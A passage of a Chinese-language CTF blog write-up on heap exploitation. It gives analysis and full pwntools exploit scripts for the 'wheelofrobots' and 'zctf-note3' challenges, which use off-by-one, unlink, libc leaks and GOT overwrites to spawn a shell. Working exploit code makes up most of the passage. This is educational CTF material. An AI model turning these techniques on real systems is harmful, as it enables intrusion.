idx2-&gt;0x603138-&gt;null</span></span><br><span class="line"><span class="comment">#get malloc to -&gt; 0x603138</span></span><br><span class="line">add(<span class="number">2</span>, <span class="number">1</span>)</span><br><span class="line"><span class="comment">#now 0x603138-&gt;null</span></span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#whell &lt;=2</span></span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line">remove(<span class="number">3</span>)</span><br></pre></td></tr></table></figure>

<p>我觉得这部分应该是顺风顺水的吧，off-by-one学过了</p>
<ol start="3">
<li>关键点</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#now only have idx1 pointer-&gt;0x603138 , it's destructor_size</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#the size must bigger than remove(2) remove(3)'s  size</span></span><br><span class="line">add(<span class="number">6</span>, <span class="number">4</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="number">7</span>)</span><br><span class="line"><span class="comment">#change idx6 size:1000</span></span><br><span class="line">change(<span class="number">1</span>, p64(<span class="number">1000</span>))</span><br><span class="line">ptr = <span class="number">0x00000000006030E8</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x50</span>) + p64(ptr<span class="number">-0x18</span>) + p64(ptr<span class="number">-0x10</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x50</span>, <span class="string">'a'</span>)</span><br><span class="line">payload += p64(<span class="number">0x50</span>) <span class="comment">#pre_size</span></span><br><span class="line">payload += p64(<span class="number">0xa0</span>) <span class="comment">#size</span></span><br><span class="line">change(<span class="number">6</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># unlink</span></span><br><span class="line">remove(<span class="number">3</span>)</span><br></pre></td></tr></table></figure>

<p>这里的话，要注意的就是开头申请的两个add了，那个不能低于remove的大小，不然会重新覆盖到那上边去，至于大小是多少，自己构造就好，然后溢出覆盖unlink，常见了</p>
<ol start="4">
<li>修改并泄露地址</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">2</span> + <span class="string">'a'</span>*<span class="number">0x18</span> + p64(ptr)</span><br><span class="line">change(<span class="number">6</span>, payload)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">write(elf.got[<span class="string">'exit'</span>], <span class="number">0x0000000000401855</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># change robot_wheel to 3</span></span><br><span class="line">write(<span class="number">0x603130</span>, <span class="number">3</span>)</span><br><span class="line">change(<span class="number">1</span>, p64(elf.got[<span class="string">'puts'</span>]))</span><br><span class="line">start_robot()</span><br><span class="line"><span class="comment"># leak </span></span><br><span class="line">io.recvuntil(<span class="string">" Thx "</span>)</span><br><span class="line">puts_addr = u64(io.recv(<span class="number">6</span>).strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">io.success(<span class="string">"puts_addr: 0x%x"</span> % puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br></pre></td></tr></table></figure>
<p>我觉得这部分跟unlink属于同一部分的，重新修改地址，这里是将tinny改成指向destructor的位置处，这样编辑1就可以编辑第6处指针，在编辑第六处就是写入了，相当于任意写<br>写入完后泄露</p>
<ol start="5">
<li>getshell了</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#get shell</span></span><br><span class="line">write(elf.got[<span class="string">'atoi'</span>], system_addr)</span><br><span class="line">io.send(<span class="string">"sh;#"</span>)</span><br></pre></td></tr></table></figure>

<p>跟前面套路一样，改掉atoi，然后传入sh就完了，ctf-wiki的改的free</p>
<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> PwnContext.core <span class="keyword">import</span> *</span><br><span class="line">local = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">exe = <span class="string">'./'</span> + <span class="string">'wheelofrobots'</span></span><br><span class="line">elf = context.binary = ELF(exe)</span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line">host = <span class="string">'127.0.0.1'</span></span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="comment">#ctx.binary = './' + 'wheelofrobots'</span></span><br><span class="line">ctx.binary = exe</span><br><span class="line">libc = args.LIBC <span class="keyword">or</span> <span class="string">'libc.so.6'</span></span><br><span class="line">ctx.debug_remote_libc = <span class="literal">True</span></span><br><span class="line">ctx.remote_libc = libc</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    io = ctx.start()</span><br><span class="line">    libc = ELF(libc)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    Partial RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      No PIE (0x400000)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx, size=<span class="number">0</span>)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"1"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, str(idx))</span><br><span class="line">    <span class="keyword">if</span> idx == <span class="number">2</span>:</span><br><span class="line">        io.sendlineafter(<span class="string">"Increase Bender's intelligence: "</span>, str(size))</span><br><span class="line">    <span class="keyword">elif</span> idx == <span class="number">3</span>:</span><br><span class="line">        io.sendlineafter(<span class="string">"Increase Robot Devil's cruelty: "</span>, str(size))</span><br><span class="line">    <span class="keyword">elif</span> idx == <span class="number">6</span>:</span><br><span class="line">        io.sendlineafter(<span class="string">"Increase Destructor's powerful: "</span>, str(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"2"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(idx, name)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"3"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, str(idx))</span><br><span class="line">    io.sendafter(<span class="string">"Robot's name: "</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start_robot</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"4"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">off_by_one</span><span class="params">(byte)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"1"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"9999"</span> + byte)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(addr1, addr2)</span>:</span></span><br><span class="line">    change(<span class="number">1</span>, p64(addr1))</span><br><span class="line">    change(<span class="number">6</span>, p64(addr2))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    add(<span class="number">2</span>, <span class="number">1</span>)</span><br><span class="line">    remove(<span class="number">2</span>)</span><br><span class="line">    off_by_one(<span class="string">'\x01'</span>)</span><br><span class="line">    <span class="comment"># change fd pointer</span></span><br><span class="line">    change(<span class="number">2</span>, p64(<span class="number">0x0000000000603138</span>))</span><br><span class="line">    off_by_one(<span class="string">'\x00'</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#pass the fastbin check size=0x20</span></span><br><span class="line">    add(<span class="number">3</span>, <span class="number">0x20</span>)</span><br><span class="line">    <span class="comment">#now idx2-&gt;0x603138-&gt;null</span></span><br><span class="line">    <span class="comment">#get malloc to -&gt; 0x603138</span></span><br><span class="line">    add(<span class="number">2</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="comment">#now 0x603138-&gt;null</span></span><br><span class="line">    add(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#whell &lt;=2</span></span><br><span class="line">    remove(<span class="number">2</span>)</span><br><span class="line">    remove(<span class="number">3</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#now only have idx1 pointer-&gt;0x603138 , it's destructor_size</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#the size must bigger than remove(2) remove(3)'s  size</span></span><br><span class="line">    add(<span class="number">6</span>, <span class="number">4</span>)</span><br><span class="line">    add(<span class="number">3</span>, <span class="number">7</span>)</span><br><span class="line">    <span class="comment">#change idx6 size:1000</span></span><br><span class="line">    change(<span class="number">1</span>, p64(<span class="number">1000</span>))</span><br><span class="line">    ptr = <span class="number">0x00000000006030E8</span></span><br><span class="line">    payload = p64(<span class="number">0</span>) + p64(<span class="number">0x50</span>) + p64(ptr<span class="number">-0x18</span>) + p64(ptr<span class="number">-0x10</span>)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x50</span>, <span class="string">'a'</span>)</span><br><span class="line">    payload += p64(<span class="number">0x50</span>) <span class="comment">#pre_size</span></span><br><span class="line">    payload += p64(<span class="number">0xa0</span>) <span class="comment">#size</span></span><br><span class="line">    change(<span class="number">6</span>, payload)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># unlink</span></span><br><span class="line">    remove(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    payload = p64(<span class="number">0</span>)*<span class="number">2</span> + <span class="string">'a'</span>*<span class="number">0x18</span> + p64(ptr)</span><br><span class="line">    change(<span class="number">6</span>, payload)</span><br><span class="line">    <span class="comment">#gdb.attach(io)</span></span><br><span class="line">    </span><br><span class="line">    write(elf.got[<span class="string">'exit'</span>], <span class="number">0x0000000000401855</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># change robot_wheel to 3</span></span><br><span class="line">    write(<span class="number">0x603130</span>, <span class="number">3</span>)</span><br><span class="line">    change(<span class="number">1</span>, p64(elf.got[<span class="string">'puts'</span>]))</span><br><span class="line">    start_robot()</span><br><span class="line">    <span class="comment"># leak </span></span><br><span class="line">    io.recvuntil(<span class="string">" Thx "</span>)</span><br><span class="line">    puts_addr = u64(io.recv(<span class="number">6</span>).strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">    io.success(<span class="string">"puts_addr: 0x%x"</span> % puts_addr)</span><br><span class="line">    libc_base = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment">#get shell</span></span><br><span class="line">    write(elf.got[<span class="string">'atoi'</span>], system_addr)</span><br><span class="line">    io.send(<span class="string">"sh;#"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure>


<h2 id="zctf-note3"><a href="#zctf-note3" class="headerlink" title="zctf-note3"></a>zctf-note3</h2><p>这道题算自己做的了，自己分析漏洞点，自己做，不过有两个位置卡住了，暂时未得以解决先记录下来，从他人wp里获得的解决方案</p>
<h3 id="功能分析-1"><a href="#功能分析-1" class="headerlink" title="功能分析"></a>功能分析</h3><p>有增删查改，<br>查询部分是没用的，无法泄露</p>
<h3 id="漏洞点分析-1"><a href="#漏洞点分析-1" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h3><p>不知道为什么，看到这个读取函数瞬间就懂怎么做了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">sub_4008DD</span><span class="params">(__int64 a1, __int64 a2, <span class="keyword">char</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [rsp+Ch] [rbp-34h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+2Fh] [rbp-11h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 i; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">ssize_t</span> v7; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = a3;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0L</span>L; a2 - <span class="number">1</span> &gt; i; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = read(<span class="number">0</span>, &amp;buf, <span class="number">1u</span>LL);</span><br><span class="line">    <span class="keyword">if</span> ( v7 &lt;= <span class="number">0</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( buf == v4 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    *(_BYTE *)(i + a1) = buf;</span><br><span class="line">  &#125;</span><br><span class="line">  *(_BYTE *)(a1 + i) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>a2-1跟我前面做过的一两道题都类似，利用0-1负数，然后转成无符号比较，变成很大，也就是堆溢出</p>
<p><strong>注意：这里的坑点就是a3, a3假设被定为\n，我们sendline的时候sendline(p64(addr))会覆盖到下一个地址的最后一位，并将他改成\x00，这是最坑的点了，我被这个坑了好久</strong></p>
<h3 id="漏洞利用过程-3"><a href="#漏洞利用过程-3" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h3><ol>
<li>准备工作</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"option---&gt;&gt;\n"</span>, <span class="string">"1"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Input the length of the note content:(less than 1024)\n"</span>, str(size))</span><br><span class="line">    io.sendlineafter(<span class="string">"Input the note content:\n"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"option---&gt;&gt;\n"</span>, <span class="string">"2"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"option---&gt;&gt;\n"</span>, <span class="string">"3"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Input the id of the note:\n"</span>, str(idx))</span><br><span class="line">    io.sendlineafter(<span class="string">"Input the new content:\n"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"option---&gt;&gt;\n"</span>, <span class="string">"4"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Input the id of the note:\n"</span>, str(idx))</span><br></pre></td></tr></table></figure>

<p>不用多说吧，每道堆题一样的套路</p>
<ol start="2">
<li>unlink部分</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>, <span class="string">'a'</span>*<span class="number">0x8</span>) <span class="comment">#idx0</span></span><br><span class="line">add(<span class="number">0</span>, <span class="string">'b'</span>*<span class="number">0x8</span>) <span class="comment">#idx1</span></span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">'c'</span>*<span class="number">0x80</span>) <span class="comment">#idx2</span></span><br><span class="line">ptr = <span class="number">0x6020c8</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x30</span>) + p64(ptr<span class="number">-0x18</span>) + p64(ptr<span class="number">-0x10</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x30</span>, <span class="string">'a'</span>)</span><br><span class="line">payload += p64(<span class="number">0x30</span>)</span><br><span class="line">payload += p64(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">0</span>, payload)</span><br><span class="line">delete(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>

<p><strong>这里有坑，切记，不能删掉idx1在进行覆盖，会报错，至于具体报错原因我不清楚，我估计是fastbin链上修改成了错误的fd指针，检测到了，这个问题待解决</strong></p>
<p>简单的unlink</p>
<ol start="3">
<li>这里我利用了上一道题的思路，一样的做，修改idx0指向idx1指针部分，通过修改idx0，然后达到任意地址写</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">free_got = elf.got[<span class="string">'free'</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">atol_got = elf.got[<span class="string">'atol'</span>]</span><br><span class="line">atoi_got = elf.got[<span class="string">'atoi'</span>]</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x18</span> + p64(ptr+<span class="number">8</span>) + p64(elf.got[<span class="string">'free'</span>]) </span><br><span class="line"><span class="comment">#payload = 'a'*0x18 + p64(free_got) + p64(puts_got)</span></span><br><span class="line">edit(<span class="number">0</span>, payload)</span><br><span class="line"><span class="comment">#edit(0, p64(puts_plt)[:-1])</span></span><br><span class="line">edit(<span class="number">1</span>, p64(elf.plt[<span class="string">'puts'</span>])[:<span class="number">-1</span>]) <span class="comment">#关键点，切记，不能破坏到下一个地址，不然会出错</span></span><br><span class="line"><span class="comment">#delete(1)</span></span><br><span class="line">edit(<span class="number">0</span>, p64(atol_got))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">atol_addr = u64(io.recvline().strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">libc_base = atol_addr - libc.symbols[<span class="string">'atol'</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">io.success(<span class="string">"libc_base: 0x%x"</span> % libc_base)</span><br><span class="line">io.success(<span class="string">"atol_got: 0x%x"</span> % atol_got)</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>getshell</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">0</span>, p64(atoi_got))</span><br><span class="line">edit(<span class="number">1</span>, p64(system_addr)[:<span class="number">-1</span>])</span><br><span class="line">gdb.attach(io)</span><br><span class="line">io.sendline(<span class="string">"/bin/sh;#"</span>)</span><br></pre></td></tr></table></figure>

<h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> PwnContext.core <span class="keyword">import</span> *</span><br><span class="line">local = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">exe = <span class="string">'./'</span> + <span class="string">'note3'</span></span><br><span class="line">elf = context.binary = ELF(exe)</span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line">host = <span class="string">'127.0.0.1'</span></span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="comment">#ctx.binary = './' + 'note3'</span></span><br><span class="line">ctx.binary = exe</span><br><span class="line">libc = args.LIBC <span class="keyword">or</span> <span class="string">'libc.so.6'</span></span><br><span class="line">ctx.debug_remote_libc = <span class="literal">True</span></span><br><span class="line">ctx.remote_libc = libc</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    io = ctx.start()</span><br><span class="line">    libc = ELF(libc)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    Partial RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      No PIE (0x400000)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"option---&gt;&gt;\n"</span>, <span class="string">"1"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Input the length of the note content:(less than 1024)\n"</span>, str(size))</span><br><span class="line">    io.sendlineafter(<span class="string">"Input the note content:\n"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"option---&gt;&gt;\n"</span>, <span class="string">"2"</span>)</span><br><span class="line"></span><br><span class="line"><span 